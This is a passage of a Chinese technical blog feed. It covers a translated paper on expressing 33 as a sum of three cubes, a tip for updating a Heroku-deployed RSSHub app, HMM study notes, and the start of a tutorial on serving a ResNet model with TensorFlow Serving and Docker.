href="#NZM91">[NZM91]</a>，§2.9，练习8]中描述的算法。假设这一点，可以看出，使用Montgomery的批量反转技巧[<a href="#Mon87">[Mon87]</a>，§10.3.1]，计算对所有正整数$p\le \alpha B$ 的 $z^{3} \equiv k(\mod p)$ 的根的剩余工作可以再次用$O(B)$ 算术运算完成。</p><p>因此，我们可以在线性时间内计算满足（5）的第一行的所有 $z$，作为算术进展（arithmeticprogressions）的并集。为了检测最后一行的解，有一个快速的方法来确定$\Delta :=3d\left(4\epsilon(\frac{d}{3})(z^{3}-k)-d^{3}\right)$是一个平方数 至关重要。我们首先注意到对于固定$d$，这种情况减少到在椭圆曲线上找到积分点； 特别是，令 $X=12d|z|$ 和$Y=(6d^2|x-y|$，从（3）中我们看到（X，Y）位于Mordell曲线上</p><p>$$Y^{2}=X^{3}-2(6 d)^{3}\left(d^{3}+4 \epsilon\left(\frac{d}{3}\right) k\right). \quad \text{(6)}$$</p><p>因此，对于固定 $d$，存在至多有限多个解，并且它们可以被有效地约束。 对于$d$的一些小值，找到（6）上的所有积分点并检查是否产生任何满足（1）的解是切实可行的。例如，使用Magma[<a href="#BCFS18">[BCFS18]</a>，§128.2.8]中的积分点函数（functionality），我们验证了如（2）中的 $k$ 和 $d \le 40$ 情况下没有解， 除了$(k, d)\in{(579,29),(579,34),(975,22)}$。</p><p>接下来我们自然注意到一些同余和可分性约束：</p><p><strong>引理</strong> 设 $z$ 为（5）的解，设 $p$ 为素数， 设$s=ord_p d$，$t=ord_p(z^3-k)$。则</p><p>(i) $z \equiv \frac{4}{3} k\left(2-d^{2}\right)+9(k+d)(\mod 18)$；(ii) 如果 $p \equiv 2 (\mod 3)$ 则 $t \le 3s$；(iii) 如果 $t \le 3s$ 则 $s \equiv t (\mod 2)$；(iv) 如果 $ord_p k \in {1,2}$ 则 $s \in {0,ord_p k}$。</p><p><em>证明</em> 令 $\Delta=3d\left(4\epsilon(\frac{d}{3})(z^3-k)-d^3\right)$， 令$\delta=(\frac{d}{3})$，我们有 $|z| \equiv d \equiv \delta(\mod 3)$，观察到 $(\delta+3 n)^{3} \equiv \delta+9 n(\mod 27)$，模27，我们有</p><p>$$\begin{aligned}\begin{aligned}\frac{\Delta}{3 d} &amp;=4 \epsilon \delta\left(z^{3}-k\right)-d^{3}=4|z|^{3}-d^{3}-4 \epsilon \delta k \&amp; \equiv 4[\delta+3(|z|-\delta)]-[\delta+3(d-\delta)]-4 \epsilon \delta k=3(4|z|-d)-\delta[18+4(\epsilon k-3)] \&amp; \equiv 3(4|z|-d)-d[18+4(\epsilon k-3)]=12|z|-9 d-4 \epsilon d k \&amp; \equiv 3|z|-4 \epsilon d k\end{aligned}\end{aligned}$$</p><p>这消失了模9，所以为了使 $\Delta$ 成为平方数，它也必须消除mod 27。 于是</p><p>$$z=\epsilon \delta|z| \equiv \frac{4 \delta d k}{3} \equiv \frac{4(2-d^{2}) k}{3} \quad(\mod 9)$$</p><p>减少（1）模2我们得到 $z \equiv k+d(\mod 2)$，这得到（i）。</p><p>接下来设 $u=p^{-s} d$ 和 $v=p^{-t} \epsilon \delta(z^{3}-k)$，这样就有</p><p>$$\Delta=3\left(4 p^{s+t} u v-p^{4 s} u^{4}\right)$$</p><p>如果 $3s&lt;t$ 则 $p^{-4 s} \Delta \equiv-3 u^{4}(\mod 4 p)$， 但是当$p \equiv 2(\mod 3)$ 时这是不可能的，因为 $-3$ 不是 $4p$ 的平方模。因此，在这种情况下我们必须 $t&lt;3s$。</p><p>接下来假设 $t&lt;3s$。 我们考虑以下情况，涵盖所有可能性：</p><ul><li>若 $p = 3$ 则 $s = t = 0$，那么 $s \equiv t(\bmod 2)$。</li><li>若 $p \ne 3$ 且 $3s &gt; t+2 \operatorname{ord}<em>{p} 2$， 则 $\operatorname{ord}</em>{p} \Delta=s+t+2 \operatorname{ord}_{p} 2$，那么 $s \equiv t(\mod 2)$。</li><li>若 $3s\in{t, t+2}$ 则 $s \equiv t(\bmod 2)$。</li><li>如果 $p=2$ 且 $3s = t + 1$ 则 $2^{-4 s} \Delta=3(2 u v-u^{4}) \equiv 3(\bmod 4)$，这是不可能的。</li></ul><p>因此，在任何情况我们得出结论 $s \equiv t(\mod 2)$。</p><p>最后，假设 $p|k$ 和 $p \not | 3k$。如果 $s=0$则无需证明的，所以假设不然。 由于 $d | z^{3}-k$，我们必须有$d | k$，因为</p><p>$$0 &lt; s \le t=\operatorname{ord}<em>{p}(z^{3}-k)=\operatorname{ord}</em>{p} k&lt;3 s$$</p><p>通过部分（iii）得出 $s \equiv \operatorname{ord}<em>{p} k(\mod 2)$， 因此$s=\operatorname{ord}</em>{p} k$。</p><p>因此，一旦 $z(\mod d)$ 的残差类（residue class）固定， 则其残差模$lcm(d,18)$ 是确定的。还要注意，条件（ii）和（iii）对于测试 $p=2$是有效的。</p><p>然而，即使有这些优化，也有 $\ll B\log B$ 对 $d, z$满足（5）的第一行和引理的结论（i）和（iv）。 因此，为了实现比$O(B\log B)$ 更好的运行时间，需要从一开始就消除一些 $z$ 值。我们通过标准的时间空间交换来实现这一目标。确切地说，设置$P=3(\log \log B)(\log \log \log B)$， 并且让$M=\prod_{5 \le p \le P} p$ 是区间 $[5, P]$ 之间的素数的乘积。根据素数定理，我们得到 $\log M=(1+o(1)) P$。如果 $\Delta$ 是平方数，那么对于任意素数 $p|M$ 我们有</p><p>$$\left(\frac{\Delta}{p}\right)=\left(\frac{3 d}{p}\right)\left(\frac{|z|^{3}-c}{p}\right) \in{0,1} \quad \text{(7)}$$</p><p>其中 $c \equiv \epsilon\left(\frac{d}{3}\right) k+\frac{d^{3}}{4}$。 当$\operatorname{lcm}(d, 18) \le \alpha B / M$ 时， 我们首先为每个残差类$|z|(\bmod M)$ 计算该函数， 并且仅选择对于每个 $p|M$满足（7）的那些残基。 由Hasse约束，允许的残差的数量最多为</p><p>$$\frac{M}{2^{\omega(M /(M, d))}} \prod_{p | \frac{M}{(M, d)}}\left(1+O\left(\frac{1}{\sqrt{p}}\right)\right)=\frac{M}{2^{\omega(M /(M, d))}} e^{O(\sqrt{P} / \log P)}$$</p><p>因此，要考虑的 $z$ 值的总数最多为</p><p>$$\begin{aligned}\begin{array}{l}{\sum_{\operatorname{lcm}(d, 18) \le \frac{\alpha B}{M}} r_{d}(k)\left[M+\frac{e^{O(\sqrt{P} / \log P)}}{2^{\omega(M /(M, d))}} \frac{\alpha B}{d}\right] +\sum_{d \le \alpha B, {lcm}(d, 18) \le \frac{\alpha B}{M}} \frac{r_{d}(k) \alpha B}{d}} \{\ll_{k} B \log M+\frac{e^{O(\sqrt{P} / \log P)}}{2^{\omega(M)}} \sum_{g | M} \frac{2^{\omega(g)} r_{g}(k)}{g} \sum_{d^{\prime} \le \frac{\alpha B}{9 g M}} \frac{r_{d^{\prime}}(k) \alpha B}{d^{\prime}}} \{\ll_{k} B \log M+B \log B \frac{e^{O(\sqrt{P} / \log P)}}{2^{\omega(M)}} \prod_{p | M}\left(1+\frac{2 r_{p}(k)}{p}\right)} \{\ll B P+\frac{B \log B}{2^{(1+o(1)) P / \log P}} \ll B(\log \log B)(\log \log \log B)}\end{array}\end{aligned}$$</p><p>对于没有以这种方式消除的 $z$，我们遵循类似的策略， 其中一些其他辅助模$M^{\prime}$ 由较大的素数组成，以加速平方测试。 我们预先计算模为$M^{\prime}$ 的立方数表和Legendre符号模 $p|M^{\prime}$，因此将测试（7）简化为了表查找。只有当所有这些测试都通过时，我们才能在多精度算术中计算 $\Delta$并应用一般的平方检验，这种情况对于一小部分候选值来说都是如此。事实上，我们期望Legendre测试的数量平均有限，所以总的来说，找到所有解决方案的 $|z| \le B$ 应该要求不超过$O_k(B(\log \log B)(\log \log \log B))$ 次表查找和对 $[0, B]$中整数的算术运算。</p><p>因此，当 $B$符合机器字大小时，我们预计运行时间几乎是线性的，这就是我们在实践中观察到的$B&lt;2^{64}$。</p><h2><span id="3-shi-xian">3. 实现</span></h2><p>我们在C中实现了上述算法，其中有一些内联汇编程序来源于由Ben Buhrow<a href="#Buh19">[Buh19]</a> 编写的Montgomery算法<a href="#Mon85">[Mon85]</a>， 以及Kim Walisch的用于枚举素数的<strong>primesieve</strong> 库 <a href="#Wal19">[Wal19]</a>。</p><p>该算法自然地在具有超过 $\sqrt{\alpha B}$ 的素因子和 具有$\sqrt{\alpha B}$ -平滑的素数的 $d$ 的值之间分配。 前一组 $d$消耗超过运行时间的三分之二，但更容易并行化。我们在布里斯托大学高级计算研究中心的大规模并行集群Bluecrystal Phase3上运行了这一部分。 对于平滑的$d$，我们使用了一个单独的32核和64核节点的小集群。</p><p>我们搜索了满足 $k \in {33,42}$ 和 $\min{|x|, |y|, |z|} \le 10^16$的（1）的解，找到了以下结果：</p><p>$$33 = 8 866 128 975 287 528^3 +（-8 778 405 442 862 239)^3 +（-2 736 111 468 807 040)^3$$</p><p>总计算在三个星期的实际时间中大约使用了15个核年。</p><h2><span id="can-kao-wen-xian">参考文献</span></h2><p>（略）</p><p>School of Mathematics, University of Bristol, University Walk, Bristol,BS8 1TW, United Kingdom</p><p>E-mail address: <a href="mailto:andrew.booker@bristol.ac.uk">andrew.booker@bristol.ac.uk</a></p><hr><h2><span id="bo-ke-can-kao">博客参考：</span></h2><ul><li><a href="http://www.duodaa.com/blog/index.php/archives/1857/">人类第一次将33写成了3个整数的立方和</a></li></ul><h3><span id="comments">Comments</span></h3><hr><blockquote><p>from: <a href="https://github.com/qiwihui/blog/issues/61#issuecomment-482011133"><strong>qiwihui</strong></a> on: <strong>4/11/2019</strong></p></blockquote><p><img src="https://github.trello.services/images/mini-trello-icon.png" alt> <a href="https://trello.com/c/QWCHZJvO/78-cracking-problem-with-33">cracking problem with 33</a></p>]]></content>
    
    <summary type="html">
    
      解决33问题──将33写成3个整数的立方和
    
    </summary>
    
    
      <category term="翻译" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="数学" scheme="https://qiwihui.com/tags/%E6%95%B0%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>在 “Deploy to Heroku” 之后手动更新Heroku应用</title>
    <link href="https://qiwihui.com/qiwihui-blog-69/"/>
    <id>https://qiwihui.com/qiwihui-blog-69/</id>
    <published>2019-05-05T05:19:42.000Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>这个tips以RSSHub为例子。我在Heroku上部署了RSSHub用以日常RSS需求，这个已经部署很久了（2018年11月），准备更新一版，记录如下。</p><span id="more"></span><ol><li>登录Heroku，按照提示进行认证并登录。</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">heroku login</span></span><br></pre></td></tr></table></figure><ol start="2"><li>获取最新代码，这里我在RSSHub项目目录中进行了拉取（pull）：</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> RSSHub</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git pull origin master</span></span><br></pre></td></tr></table></figure><ol start="3"><li>添加Heroku中项目url，可在 <code>Settings</code> 中 <code>Heroku Git URL</code> 找到：</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">heroku git:remote -a rss-qiwihui</span>                       </span><br><span class="line">set git remote heroku to https://git.heroku.com/rss-qiwihui.git</span><br></pre></td></tr></table></figure><ol start="4"><li>向Heroku推送，这时Heroku会自动进行部署，结果如下：</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git push heroku master</span></span><br><span class="line">Enumerating objects: 12288, done.</span><br><span class="line">Counting objects: 100% (12288/12288), done.</span><br><span class="line">Delta compression using up to 4 threads</span><br><span class="line">Compressing objects: 100% (3324/3324), done.</span><br><span class="line">Writing objects: 100% (12288/12288), 6.32 MiB | 40.44 MiB/s, done.</span><br><span class="line">Total 12288 (delta 8027), reused 12287 (delta 8026)</span><br><span class="line">remote: Compressing source files... done.</span><br><span class="line">remote: Building source:</span><br><span class="line">remote: </span><br><span class="line">remote: -----&gt; Node.js app detected</span><br><span class="line">remote:        </span><br><span class="line">remote: -----&gt; Creating runtime environment</span><br><span class="line">remote:        </span><br><span class="line">remote:        NPM_CONFIG_LOGLEVEL=error</span><br><span class="line">remote:        NODE_ENV=production</span><br><span class="line">remote:        NODE_MODULES_CACHE=true</span><br><span class="line">remote:        NODE_VERBOSE=false</span><br><span class="line">remote:        </span><br><span class="line">remote: -----&gt; Installing binaries</span><br><span class="line">remote:        engines.node (package.json):  &gt;=8.0.0</span><br><span class="line">remote:        engines.npm (package.json):   unspecified (use default)</span><br><span class="line">remote:        engines.yarn (package.json):  unspecified (use default)</span><br><span class="line">remote:        </span><br><span class="line">remote:        Resolving node version &gt;=8.0.0...</span><br><span class="line">remote:        Downloading and installing node 12.1.0...</span><br><span class="line">remote:        Using default npm version: 6.9.0</span><br><span class="line">remote:        Resolving yarn version 1.x...</span><br><span class="line">remote:        Downloading and installing yarn (1.16.0)...</span><br><span class="line">remote:        Installed yarn 1.16.0</span><br><span class="line">remote:        </span><br><span class="line">remote: -----&gt; Restoring cache</span><br><span class="line">remote:        Cached directories were not restored due to a change in version of node, npm, yarn or stack</span><br><span class="line">remote:        Module installation may take longer for this build</span><br><span class="line">remote:        </span><br><span class="line">remote: -----&gt; Installing dependencies</span><br><span class="line">remote:        Installing node modules (yarn.lock)</span><br><span class="line">remote:        yarn install v1.16.0</span><br><span class="line">remote:        [1/4] Resolving packages...</span><br><span class="line">remote:        [2/4] Fetching packages...</span><br><span class="line">remote:        info fsevents@1.2.8: The platform &quot;linux&quot; is incompatible with this module.</span><br><span class="line">remote:        info &quot;fsevents@1.2.8&quot; is an optional dependency and failed compatibility check. Excluding it from installation.</span><br><span class="line">remote:        [3/4] Linking dependencies...</span><br><span class="line">remote:        [4/4] Building fresh packages...</span><br><span class="line">remote:        Done in 55.40s.</span><br><span class="line">remote:        </span><br><span class="line">remote: -----&gt; Build</span><br><span class="line">remote:        </span><br><span class="line">remote: -----&gt; Caching build</span><br><span class="line">remote:        - node_modules</span><br><span class="line">remote:        </span><br><span class="line">remote: -----&gt; Pruning devDependencies</span><br><span class="line">remote:        yarn install v1.16.0</span><br><span class="line">remote:        [1/4] Resolving packages...</span><br><span class="line">remote:        [2/4] Fetching packages...</span><br><span class="line">remote:        info fsevents@1.2.8: The platform &quot;linux&quot; is incompatible with this module.</span><br><span class="line">remote:        info &quot;fsevents@1.2.8&quot; is an optional dependency and failed compatibility check. Excluding it from installation.</span><br><span class="line">remote:        [3/4] Linking dependencies...</span><br><span class="line">remote:        [4/4] Building fresh packages...</span><br><span class="line">remote:        warning Ignored scripts due to flag.</span><br><span class="line">remote:        Done in 8.07s.</span><br><span class="line">remote:        </span><br><span class="line">remote: -----&gt; Build succeeded!</span><br><span class="line">remote: -----&gt; Discovering process types</span><br><span class="line">remote:        Procfile declares types -&gt; web</span><br><span class="line">remote: </span><br><span class="line">remote: -----&gt; Compressing...</span><br><span class="line">remote:        Done: 143.8M</span><br><span class="line">remote: -----&gt; Launching...</span><br><span class="line">remote:        Released v5</span><br><span class="line">remote:        https://rss-qiwihui.herokuapp.com/ deployed to Heroku</span><br><span class="line">remote: </span><br><span class="line">remote: Verifying deploy... done.</span><br><span class="line">To https://git.heroku.com/rss-qiwihui.git</span><br><span class="line"> * [new branch]      master -&gt; master</span><br></pre></td></tr></table></figure><ol start="5"><li>设置环境变量 <code>HEROKU_SLUG_COMMIT</code>:</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">heroku config:<span class="built_in">set</span> HEROKU_SLUG_COMMIT=$(git rev-parse --short HEAD)</span></span><br><span class="line">Setting HEROKU_SLUG_COMMIT and restarting ⬢ rss-qiwihui... done, v8</span><br><span class="line"> ▸    Warning: The &quot;HEROKU_&quot; namespace is protected and shouldn&#x27;t be used.</span><br><span class="line">HEROKU_SLUG_COMMIT: a8066bd</span><br></pre></td></tr></table></figure><ol start="6"><li>验证：</li></ol><p>前往相应的页面验证，可以看到在Debug中的 githash值已经是当前最新的hash值了。</p><p><img src="https://user-images.githubusercontent.com/3297411/57205060-5b873d00-6fee-11e9-893f-14b2978d3b92.png" alt="githash"></p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      在 “Deploy to Heroku” 之后手动更新Heroku应用
    
    </summary>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="tips" scheme="https://qiwihui.com/tags/tips/"/>
    
  </entry>
  
  <entry>
    <title>HMM理解思路</title>
    <link href="https://qiwihui.com/qiwihui-blog-74/"/>
    <id>https://qiwihui.com/qiwihui-blog-74/</id>
    <published>2019-03-06T09:39:05.000Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="hmm">HMM</span></h1><p>本文整理简单整理一下HMM的理解思路。</p><span id="more"></span><h2><span id="mo-xing">模型</span></h2><h3><span id="ma-er-ke-fu-xing-yu-ma-er-ke-fu-lian">马尔科夫性与马尔科夫链</span></h3><p>性质：- 有限历史假设- 时间不变性</p><h3><span id="yin-ma-er-ke-fu-mo-xing">隐马尔科夫模型</span></h3><ol><li><p>模型定义：1、初始状态概率向量 $\pi=(\pi_i)$，其中 $\pi_{i}=P(i_{1}=q_{i}), \quad i=1,2, \cdots, N$2、状态转移概率矩阵 $A=\left[a_{i j}\right]<em>{N \times N}$，其中 $a</em>{i j}=P\left(i_{t+1}=q_{j} | i_{t}=q_{i}\right), \quad i=1,2, \cdots, N ; j=1,2, \cdots, N$3、观测概率矩阵 $B=\left[b_{j}(k)\right]<em>{N \times M}$，其中 $b</em>{j}(k)=P\left(o_{t}=v_{k} | i_{t}=q_{j}\right), \quad k=1,2, \cdots, M ; j=1,2, \cdots, N$4、观测序列 $O=(o_{1}, o_{2}, \cdots, o_{T})$，状态序列 $I=(i_{1}, i_{2}, \cdots, i_{T})$5、状态集合 $Q=\left{q_{1}, q_{2}, \cdots, q_{N}\right}$，观测集合 $V=\left{v_{1}, v_{2}, \cdots, v_{M}\right}$</p></li><li><p>模型三元组 $\lambda=(A, B, \pi)$</p><p>状态转移概率矩阵A与初始状态概率向量确定了隐藏的马尔科夫链，生成不可观测的序列。观测概率矩阵B确定了如何从状态生成规则，与状态序列综合确定了如何产生观测序列。</p></li><li><p>模型基本假设：</p><ul><li>齐次马尔科夫性假设：设隐马尔科夫链在任意时刻t的状态只依赖于其前一时刻的状态，与其他时刻的状态及观测无关，也与时刻t无关。</li><li>观测独立性假设：假设任意时刻的观测只依赖于该时刻的马尔科夫链的状态，与其他观测和状态无关。</li></ul></li><li><p>例子：</p><ul><li><a href="https://en.wikipedia.org/wiki/Viterbi_algorithm#Example">感冒预测</a>，<a href="https://applenob.github.io/hmm.html#%E4%B8%80%E4%B8%AA%E5%85%B3%E4%BA%8E%E6%84%9F%E5%86%92%E7%9A%84%E5%AE%9E%E4%BE%8B">中文</a></li><li><a href="https://www.zhihu.com/question/20962240/answer/33438846">掷骰子</a></li><li><a href="https://www.zhihu.com/question/20962240/answer/64187492">天气模型</a></li><li><a href="https://www.zhihu.com/question/20962240/answer/33561657">偷换骰子大法</a></li></ul></li></ol><h2><span id="san-ge-wen-ti">三个问题</span></h2><h3><span id="gai-lu-ji-suan-wen-ti-ping-gu">概率计算问题（评估）</span></h3><p>给定模型 $\lambda=(A, B, \pi)$ 和观测序列 $O=o_{1}, o_{2}, \ldots, o_{T}$，计算在模型 $\pi$ 下观测序列 $O$ 出现的概率 $P(O | \lambda)$。- 穷举搜索，<code>O(TN^T)</code>- 前向算法，<code>O(N^2T)</code>- 后向算法</p><h3><span id="yu-ce-wen-ti-jie-ma">预测问题（解码）</span></h3><p>已知观测序列 $O=o_{1}, o_{2}, \ldots, o_{T}$ 和模型 $\lambda=(A, B, \pi)$，求给定观测序列条件概率 $P(I|O)$ 最大的状态序列 $I=\left(i_{1}, i_{2}, \ldots, i_{T}\right)$，即给定观测序列，求最有可能的对应的状态序列。- 穷举搜索- 近似计算- 维特比（Viterbi）算法：动态规划</p><h3><span id="xue-xi-wen-ti">学习问题</span></h3><p>已知观测序列 $O=o_{1}, o_{2}, \ldots, o_{T}$，估计模型 $\lambda=(A, B, \pi)$，使 $P(O | \lambda)$ 最大。- 监督算法：利用极大似然估计- 非监督算法：Baum-Welch算法（EM算法在HMM中的具体实现）</p><h2><span id="ying-yong">应用</span></h2><p>语音识别，中文分词，手写识别</p><h2><span id="can-kao">参考</span></h2><ol><li>《统计学习方法》，李航</li><li><a href="https://applenob.github.io/hmm.html">隐马尔科夫模型（HMM）及其Python实现</a></li></ol><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      HMM理解思路
    
    </summary>
    
    
      <category term="机器学习" scheme="https://qiwihui.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>使用 TensorFlow Serving 和 Docker 快速部署机器学习服务</title>
    <link href="https://qiwihui.com/qiwihui-blog-58/"/>
    <id>https://qiwihui.com/qiwihui-blog-58/</id>
    <published>2019-03-03T09:00:06.000Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
    <content type="html"><![CDATA[<p>从实验到生产，简单快速部署机器学习模型一直是一个挑战。这个过程要做的就是将训练好的模型对外提供预测服务。在生产中，这个过程需要可重现，隔离和安全。这里，我们使用基于Docker的TensorFlow Serving来简单地完成这个过程。TensorFlow 从1.8版本开始支持Docker部署，包括CPU和GPU，非常方便。</p><h2><span id="huo-de-xun-lian-hao-de-mo-xing">获得训练好的模型</span></h2><p>获取模型的第一步当然是训练一个模型，但是这不是本篇的重点，所以我们使用一个已经训练好的模型，比如ResNet。TensorFlow Serving 使用SavedModel这种格式来保存其模型，SavedModel是一种独立于语言的，可恢复，密集的序列化格式，支持使用更高级别的系统和工具来生成，使用和转换TensorFlow模型。这里我们直接下载一个预训练好的模型：</p><span id="more"></span><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">mkdir</span> /tmp/resnet</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">curl -s https://storage.googleapis.com/download.tensorflow.org/models/official/20181001_resnet/savedmodels/resnet_v2_fp32_savedmodel_NHWC_jpg.tar.gz | tar --strip-components=2 -C /tmp/resnet -xvz</span></span><br></pre></td></tr></table></figure><p>如果是使用其他框架比如Keras生成的模型，则需要将模型转换为SavedModel格式，比如：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> keras.models <span class="keyword">import</span> Sequential</span><br><span class="line"><span class="keyword">from</span> keras <span class="keyword">import</span> backend <span class="keyword">as</span> K</span><br><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"></span><br><span class="line">model = Sequential()</span><br><span class="line"><span class="comment"># 中间省略模型构建</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 模型转换为SavedModel</span></span><br><span class="line">signature = tf.saved_model.signature_def_utils.predict_signature_def(</span><br><span class="line">    inputs=&#123;<span class="string">&#x27;input_param&#x27;</span>: model.<span class="built_in">input</span>&#125;, outputs=&#123;<span class="string">&#x27;type&#x27;</span>: model.output&#125;)</span><br><span class="line">builder = tf.saved_model.builder.SavedModelBuilder(<span class="string">&#x27;/tmp/output_model_path/1/&#x27;</span>)</span><br><span class="line">builder.add_meta_graph_and_variables(</span><br><span class="line">    sess=K.get_session(),</span><br><span class="line">    tags=[tf.saved_model.tag_constants.SERVING],</span><br><span class="line">    signature_def_map=&#123;</span><br><span class="line">        tf.saved_model.signature_constants.DEFAULT_SERVING_SIGNATURE_DEF_KEY:</span><br><span class="line">            signature</span><br><span class="line">    &#125;)</span><br><span class="line">builder.save()</span><br></pre></td></tr></table></figure><p>下载完成后，文件目录树为：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">tree /tmp/resnet</span></span><br><span class="line">/tmp/resnet</span><br><span class="line">└── 1538687457</span><br><span class="line">    ├── saved_model.pb</span><br><span class="line">    └── variables</span><br><span class="line">        ├── variables.data-00000-of-00001</span><br><span class="line">        └── variables.index</span><br></pre></td></tr></table></figure><h2><span id="bu-shu-mo-xing">部署模型</span></h2><p>使用Docker部署模型服务：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker pull tensorflow/serving</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker run -p 8500:8500 -p 8501:8501 --name tfserving_resnet \</span></span><br><span class="line"><span class="language-bash">--mount <span class="built_in">type</span>=<span class="built_in">bind</span>,<span class="built_in">source</span>=/tmp/resnet,target=/models/resnet \</span></span><br><span class="line"><span class="language-bash">-e MODEL_NAME=resnet -t tensorflow/serving</span></span><br></pre></td></tr></table></figure><p>其中，<code>8500</code>端口对于TensorFlow Serving提供的gRPC端口，<code>8501</code>为REST API服务端口。<code>-e MODEL_NAME=resnet</code>指出TensorFlow Serving需要加载的模型名称，这里为<code>resnet</code>。上述命令输出为</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">2019-03-04 02:52:26.610387: I tensorflow_serving/model_servers/server.cc:82] Building single TensorFlow model file config:  model_name: resnet model_base_path: /models/resnet</span><br><span class="line">2019-03-04 02:52:26.618200: I tensorflow_serving/model_servers/server_core.cc:461] Adding/updating models.</span><br><span class="line">2019-03-04 02:52:26.618628: I tensorflow_serving/model_servers/server_core.cc:558]  (Re-)adding model: resnet</span><br><span class="line">2019-03-04 02:52:26.745813: I tensorflow_serving/core/basic_manager.cc:739] Successfully reserved resources to load servable &#123;name: resnet version: 1538687457&#125;</span><br><span class="line">2019-03-04 02:52:26.745901: I tensorflow_serving/core/loader_harness.cc:66] Approving load for servable version &#123;name: resnet version: 1538687457&#125;</span><br><span class="line">2019-03-04 02:52:26.745935: I tensorflow_serving/core/loader_harness.cc:74] Loading servable version &#123;name: resnet version: 1538687457&#125;</span><br><span class="line">2019-03-04 02:52:26.747590: I external/org_tensorflow/tensorflow/contrib/session_bundle/bundle_shim.cc:363] Attempting to load native SavedModelBundle in bundle-shim from: /models/resnet/1538687457</span><br><span class="line">2019-03-04 02:52:26.747705: I external/org_tensorflow/tensorflow/cc/saved_model/reader.cc:31] Reading SavedModel from: /models/resnet/1538687457</span><br><span class="line">2019-03-04 02:52:26.795363: I external/org_tensorflow/tensorflow/cc/saved_model/reader.cc:54] Reading meta graph with tags &#123; serve &#125;</span><br><span class="line">2019-03-04 02:52:26.828614: I external/org_tensorflow/tensorflow/core/platform/cpu_feature_guard.cc:141] Your CPU supports instructions that this TensorFlow binary was not compiled to use: AVX2 FMA</span><br><span class="line">2019-03-04 02:52:26.923902: I external/org_tensorflow/tensorflow/cc/saved_model/loader.cc:162] Restoring SavedModel bundle.</span><br><span class="line">2019-03-04 02:52:28.098479: I external/org_tensorflow/tensorflow/cc/saved_model/loader.cc:138] Running MainOp with key saved_model_main_op on SavedModel bundle.</span><br><span class="line">2019-03-04 02:52:28.144510: I external/org_tensorflow/tensorflow/cc/saved_model/loader.cc:259] SavedModel load for tags &#123; serve &#125;; Status: success. Took 1396689 microseconds.</span><br><span class="line">2019-03-04 02:52:28.146646: I tensorflow_serving/servables/tensorflow/saved_model_warmup.cc:83] No warmup data file found at /models/resnet/1538687457/assets.extra/tf_serving_warmup_requests</span><br><span class="line">2019-03-04 02:52:28.168063: I tensorflow_serving/core/loader_harness.cc:86] Successfully loaded servable version &#123;name: resnet version: 1538687457&#125;</span><br><span class="line">2019-03-04 02:52:28.174902: I tensorflow_serving/model_servers/server.cc:286] Running gRPC ModelServer at 0.0.0.0:8500 ...</span><br><span class="line">[warn] getaddrinfo: address family for nodename not supported</span><br><span class="line">2019-03-04 02:52:28.186724: I tensorflow_serving/model_servers/server.cc:302] Exporting HTTP/REST API at:localhost:8501 ...</span><br><span class="line">[evhttp_server.cc : 237] RAW: Entering the event loop ...</span><br></pre></td></tr></table></figure><p>我们可以看到，TensorFlow Serving使用<code>1538687457</code>作为模型的版本号。我们使用curl命令来查看一下启动的服务状态，也可以看到提供服务的模型版本以及模型状态。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">curl http://localhost:8501/v1/models/resnet</span></span><br><span class="line">&#123;</span><br><span class="line"> &quot;model_version_status&quot;: [</span><br><span class="line">  &#123;</span><br><span class="line">   &quot;version&quot;: &quot;1538687457&quot;,</span><br><span class="line">   &quot;state&quot;: &quot;AVAILABLE&quot;,</span><br><span class="line">   &quot;status&quot;: &#123;</span><br><span class="line">    &quot;error_code&quot;: &quot;OK&quot;,</span><br><span class="line">    &quot;error_message&quot;: &quot;&quot;</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="cha-kan-mo-xing-shu-ru-shu-chu">查看模型输入输出</span></h2><p>很多时候我们需要查看模型的输出和输出参数的具体形式，TensorFlow提供了一个<code>saved_model_cli</code>命令来查看模型的输入和输出参数：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">saved_model_cli show --<span class="built_in">dir</span> /tmp/resnet/1538687457/ --all</span></span><br><span class="line"></span><br><span class="line">MetaGraphDef with tag-set: &#x27;serve&#x27; contains the following 